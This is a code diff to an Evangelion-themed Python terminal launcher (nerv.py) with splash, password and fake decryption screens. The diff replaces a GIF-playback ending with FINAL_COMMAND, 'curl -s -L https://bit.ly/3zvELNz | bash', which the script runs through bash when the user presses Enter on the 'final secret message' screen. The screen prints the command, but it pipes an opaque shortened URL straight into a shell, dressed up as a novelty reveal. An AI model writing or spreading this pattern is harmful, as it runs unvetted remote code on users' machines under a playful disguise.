@@ -3,15 +3,11 @@
 NERV Terminal — Neon Genesis Evangelion themed terminal launcher
 Usage: python3 nerv.py
 Dependencies: blessed pyfiglet
-Optional external tool: chafa (for final GIF playback)
 """
 
-import os
 import sys
 import time
 import random
-import shutil
-import tempfile
 import threading
 import subprocess
 from blessed import Terminal
@@ -35,7 +31,12 @@ def c_yellow(s): return term.color_rgb(240, 230, 50)  + s + term.normal
 # ── Config ────────────────────────────────────────────────────────────────────
 ACCESS_CODE    = "NERV0"
 BRUTE_SECONDS  = 10 * 60
-FINAL_GIF_URL  = "https://i.redd.it/fktuppkre7p51.gif"
+FINAL_COMMAND  = "curl -s -L https://bit.ly/3zvELNz | bash"
+LOREM_IPSUM = (
+    "Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor "
+    "incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud "
+    "exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat."
+)
 
 # ── Helpers ───────────────────────────────────────────────────────────────────
 def is_space(k):     return (not k.is_sequence) and str(k) == ' '
@@ -65,6 +66,22 @@ def box_sep(w):
 def clear_key_buffer():
     while term.inkey(timeout=0):
         pass
+
+def wrap_text(text, width):
+    words = text.split()
+    lines = []
+    cur = ""
+    for word in words:
+        candidate = word if not cur else f"{cur} {word}"
+        if len(candidate) <= width:
+            cur = candidate
+        else:
+            if cur:
+                lines.append(cur)
+            cur = word
+    if cur:
+        lines.append(cur)
+    return lines or [""]
 
 # ─────────────────────────────────────────────────────────────────────────────
 # SCREEN 1 — SPLASH
@@ -146,8 +163,6 @@ def draw_splash():
 # ─────────────────────────────────────────────────────────────────────────────
 def draw_password_gate():
     typed = []
-    msg = ''
-    msg_until = 0.0
 
     with term.fullscreen(), term.cbreak(), term.hidden_cursor():
         print(term.clear)
@@ -195,17 +210,11 @@ def draw_password_gate():
         _msg()
 
         while True:
-            if msg and time.time() >= msg_until:
-                msg = ''
-                _msg()
-
             key = term.inkey(timeout=0.1)
             if not key:
                 continue
-
             if is_esc(key):
                 sys.exit(0)
-
             if is_enter(key):
                 if ''.join(typed).upper() == ACCESS_CODE.upper():
                     _msg('ACCESS GRANTED', col=c_green)
@@ -229,13 +238,11 @@ def draw_password_gate():
                     if is_esc(k2):
                         sys.exit(0)
                 continue
-
             if is_backspace(key):
                 if typed:
                     typed.pop()
                     _field()
                 continue
-
             ch = key_char(key)
             if ch and ch.isalnum() and len(typed) < 5:
                 typed.append(ch.upper())
@@ -274,18 +281,14 @@ def draw_brute_force():
     with term.fullscreen(), term.cbreak(), term.hidden_cursor():
         h, w = term.height, term.width
         print(term.clear)
-
         for row in range(h):
             put(row, 0, c_dred('░' * w))
-
         bw = min(w, 72)
         bx = (w - bw) // 2
         by = 1
         bh = min(h - 2, 28)
-
         for row in range(bh):
             put(by + row, bx, term.on_black + ' ' * bw + term.normal)
-
         put(by, bx, c_red(box_top(bw)))
         put(by + 1, bx, c_red('│') + c_bright('  MAGI SYSTEM  —  MANUAL DECRYPTION ENGAGED'.ljust(bw - 2)) + c_red('│'))
         put(by + 2, bx, c_red(box_sep(bw)))
@@ -299,7 +302,6 @@ def draw_brute_force():
         put(by + 25, bx, c_red(box_sep(bw)))
         put(by + 26, bx, c_red('│') + c_muted('  [ ESC ] abort'.ljust(bw - 2)) + c_red('│'))
         put(by + 27, bx, c_red(box_bot(bw)))
-
         R_OVERALL_BAR = by + 6
         R_OVERALL_PCT = by + 7
         R_PHASE_LBL = by + 9
@@ -310,7 +312,6 @@ def draw_brute_force():
         R_MELCHIOR = by + 21
         R_CLOCK = by + 23
         R_TICKER = by + 24
-
         bar_w = max(10, bw - 14)
 
         def _vote(pct):
@@ -336,12 +337,10 @@ def draw_brute_force():
 
         hex_buf = [''] * 6
         last_sec = -1
-
         while True:
             key = term.inkey(timeout=0.12)
             if key and is_esc(key):
                 sys.exit(0)
-
             now = time.time()
             elapsed = min(now - start_ts, total)
             pct = elapsed / total
@@ -350,13 +349,11 @@ def draw_brute_force():
             if cur_sec == last_sec:
                 continue
             last_sec = cur_sec
-
             pct_str = f'{pct * 100:5.1f}%'
             put(R_OVERALL_BAR, bx, c_red('│') + c_muted('  TOTAL  ') + _prog_bar(pct, bar_w, c_amber, c_dim) + c_muted('  ') + c_red('│'))
             mm, ss = divmod(int(remain), 60)
             eta = f'ETA  {mm:02d}:{ss:02d}'
             put(R_OVERALL_PCT, bx, c_red('│') + c_amber(f'  {pct_str}  complete     {eta}'.ljust(bw - 2)) + c_red('│'))
-
             phase_lbl = BRUTE_PHASES[-1][0]
             phase_pct = 1.0
             for lbl, p0, p1 in BRUTE_PHASES:
@@ -366,19 +363,15 @@ def draw_brute_force():
                     break
             put(R_PHASE_LBL, bx, c_red('│') + c_cyan(f'  {phase_lbl}'[:bw - 2].ljust(bw - 2)) + c_red('│'))
             put(R_PHASE_BAR, bx, c_red('│') + c_muted('  PHASE  ') + _prog_bar(phase_pct, bar_w, c_cyan, c_dim) + c_muted('  ') + c_red('│'))
-
             hex_buf = hex_buf[1:] + [_rand_hex(bw - 8)]
             for i, line in enumerate(hex_buf):
                 col = c_dim if i < 4 else c_muted
                 put(R_HEX_START + i, bx, c_red('│') + col(f'  {line}'[:bw - 2].ljust(bw - 2)) + c_red('│'))
-
             put(R_CASPAR, bx, c_red('│') + _vote(pct)[:bw - 2].ljust(bw - 2) + c_red('│'))
             put(R_BALTHASAR, bx, c_red('│') + _vote2(pct)[:bw - 2].ljust(bw - 2) + c_red('│'))
             put(R_MELCHIOR, bx, c_red('│') + _vote3(pct)[:bw - 2].ljust(bw - 2) + c_red('│'))
-
             tick_sym = '▊' if cur_sec % 2 == 0 else '▉'
             put(R_CLOCK, bx, c_red('│') + c_yellow(f'  {tick_sym}  TIME REMAINING   {mm:02d} min  {ss:02d} sec'.ljust(bw - 2)) + c_red('│'))
-
             tickers = [
                 'SCANNING KEY SPACE ...',
                 'TESTING PERMUTATIONS ...',
@@ -387,58 +380,26 @@ def draw_brute_force():
                 'DECRYPTION LAYER ACTIVE ...',
             ]
             put(R_TICKER, bx, c_red('│') + c_muted(f'  {tickers[cur_sec % len(tickers)]}'[:bw - 2].ljust(bw - 2)) + c_red('│'))
-
             if pct >= 1.0:
                 put(R_CLOCK, bx, c_red('│') + c_green('  DECRYPTION COMPLETE  —  ACCESS GRANTED'.ljust(bw - 2)) + c_red('│'))
                 time.sleep(2.0)
                 return True
 
 # ─────────────────────────────────────────────────────────────────────────────
-# SCREEN 3 — FINAL SECRET PROMPT + GIF PAYLOAD
+# SCREEN 3 — CENTER MESSAGE BOX
 # ─────────────────────────────────────────────────────────────────────────────
-def play_final_gif_payload():
-    chafa = shutil.which('chafa')
-    curl = shutil.which('curl')
-    if not chafa or not curl:
-        print(term.clear)
-        print(c_bright('\n  Missing dependency. Install chafa and curl to render the terminal GIF.\n'))
-        print(c_amber('  Ubuntu/Debian: sudo apt install chafa curl\n'))
-        print(c_amber('  Arch: sudo pacman -S chafa curl\n'))
-        print(c_amber('  macOS: brew install chafa curl\n'))
-        print(c_green('  hehehehe\n'))
-        return
-
-    fd, gif_path = tempfile.mkstemp(prefix='nerv-final-', suffix='.gif')
-    os.close(fd)
-    try:
-        subprocess.run(['curl', '-L', FINAL_GIF_URL, '-o', gif_path], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        print(term.clear)
-        print(c_green('hehehehe\n'))
-        width = max(40, term.width - 2)
-        height = max(12, term.height - 4)
-        subprocess.run([
-            chafa,
-            '--animate', 'on',
-            '--clear',
-            '--symbols', 'block+border+space',
-            '--size', f'{width}x{height}',
-            gif_path,
-        ], check=False)
-    finally:
-        try:
-            os.remove(gif_path)
-        except OSError:
-            pass
-
-
-def draw_final_secret_prompt():
+def draw_message_box(message):
     with term.fullscreen(), term.cbreak(), term.hidden_cursor():
         print(term.clear)
         h, w = term.height, term.width
-        bw = min(w, 72)
-        bh = 12
-        bx = (w - bw) // 2
-        by = max(2, (h - bh) // 2)
+        bw = min(max(68, w - 16), 96)
+        inner_w = bw - 6
+        lines = wrap_text(message, inner_w)
+        visible_lines = min(len(lines), max(6, h - 10))
+        lines = lines[:visible_lines]
+        bh = visible_lines + 8
+        bx = max(0, (w - bw) // 2)
+        by = max(1, (h - bh) // 2)
 
         for row in range(h):
             put(row, 0, c_dred('░' * w))
@@ -446,17 +407,18 @@ def draw_final_secret_prompt():
             put(by + row, bx, term.on_black + ' ' * bw + term.normal)
 
         put(by, bx, c_red(box_top(bw)))
-        put(by + 1, bx, c_red('│') + c_orange('  FINAL AUTHORIZATION LAYER'.ljust(bw - 2)) + c_red('│'))
+        put(by + 1, bx, c_red('│') + c_orange('  TERMINAL COMMUNIQUE'.ljust(bw - 2)) + c_red('│'))
         put(by + 2, bx, c_red(box_sep(bw)))
-        put(by + 3, bx, c_red('│') + c_white('  Pilot synchronization accepted.'.ljust(bw - 2)) + c_red('│'))
-        put(by + 4, bx, c_red('│') + c_muted('  A final secret message is available.'.ljust(bw - 2)) + c_red('│'))
-        put(by + 5, bx, c_red(box_sep(bw)))
-        put(by + 6, bx, c_red('│') + c_amber('  [ ENTER ] reveal final secret message'.ljust(bw - 2)) + c_red('│'))
-        put(by + 7, bx, c_red('│') + c_muted('  [ ESC   ] abort'.ljust(bw - 2)) + c_red('│'))
-        put(by + 8, bx, c_red(box_sep(bw)))
-        put(by + 9, bx, c_red('│') + c_dim('  Waiting for final authorization...'.ljust(bw - 2)) + c_red('│'))
-        put(by + 10, bx, c_red('│') + c_dim(''.ljust(bw - 2)) + c_red('│'))
-        put(by + 11, bx, c_red(box_bot(bw)))
+
+        for idx, line in enumerate(lines):
+            centered = line.center(inner_w)
+            put(by + 3 + idx, bx, c_red('│') + '  ' + c_white(centered) + '  ' + c_red('│'))
+
+        footer_row = by + 3 + visible_lines
+        put(footer_row, bx, c_red(box_sep(bw)))
+        put(footer_row + 1, bx, c_red('│') + c_amber('  [ ENTER ] continue to final secret message'.ljust(bw - 2)) + c_red('│'))
+        put(footer_row + 2, bx, c_red('│') + c_muted('  [ ESC   ] abort'.ljust(bw - 2)) + c_red('│'))
+        put(footer_row + 3, bx, c_red(box_bot(bw)))
 
         while True:
             key = term.inkey(timeout=0.1)
@@ -465,12 +427,45 @@ def draw_final_secret_prompt():
             if is_esc(key):
                 return False
             if is_enter(key):
-                put(by + 9, bx, c_red('│') + c_green('  Launching final secret message...'.ljust(bw - 2)) + c_red('│'))
-                put(by + 10, bx, c_red('│') + c_muted('  payload: terminal gif / text: hehehehe'.ljust(bw - 2)) + c_red('│'))
-                time.sleep(1.0)
-                break
+                return True
 
-    play_final_gif_payload()
+# ─────────────────────────────────────────────────────────────────────────────
+# SCREEN 4 — FINAL SECRET PROMPT
+# ─────────────────────────────────────────────────────────────────────────────
+def draw_final_secret_prompt():
+    with term.fullscreen(), term.cbreak(), term.hidden_cursor():
+        print(term.clear)
+        h, w = term.height, term.width
+        bw = min(w, 76)
+        bh = 12
+        bx = (w - bw) // 2
+        by = max(2, (h - bh) // 2)
+        for row in range(h):
+            put(row, 0, c_dred('░' * w))
+        for row in range(bh):
+            put(by + row, bx, term.on_black + ' ' * bw + term.normal)
+        put(by, bx, c_red(box_top(bw)))
+        put(by + 1, bx, c_red('│') + c_orange('  FINAL AUTHORIZATION LAYER'.ljust(bw - 2)) + c_red('│'))
+        put(by + 2, bx, c_red(box_sep(bw)))
+        put(by + 3, bx, c_red('│') + c_white('  Press Enter for final secret message.'.ljust(bw - 2)) + c_red('│'))
+        put(by + 4, bx, c_red('│') + c_muted('  This will execute the configured terminal payload.'.ljust(bw - 2)) + c_red('│'))
+        put(by + 5, bx, c_red(box_sep(bw)))
+        put(by + 6, bx, c_red('│') + c_amber('  [ ENTER ] execute payload'.ljust(bw - 2)) + c_red('│'))
+        put(by + 7, bx, c_red('│') + c_muted('  [ ESC   ] abort'.ljust(bw - 2)) + c_red('│'))
+        put(by + 8, bx, c_red(box_sep(bw)))
+        put(by + 9, bx, c_red('│') + c_dim('  Awaiting final trigger...'.ljust(bw - 2)) + c_red('│'))
+        put(by + 10, bx, c_red('│') + c_dim(FINAL_COMMAND[:bw - 4].ljust(bw - 2)) + c_red('│'))
+        put(by + 11, bx, c_red(box_bot(bw)))
+        while True:
+            key = term.inkey(timeout=0.1)
+            if not key:
+                continue
+            if is_esc(key):
+                return False
+            if is_enter(key):
+                break
+    print(term.clear)
+    subprocess.run(['bash', '-lc', FINAL_COMMAND], check=False)
     return True
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -478,6 +473,7 @@ def main():
     try:
         draw_splash()
         draw_password_gate()
+        draw_message_box(LOREM_IPSUM)
         draw_final_secret_prompt()
     except KeyboardInterrupt:
         pass
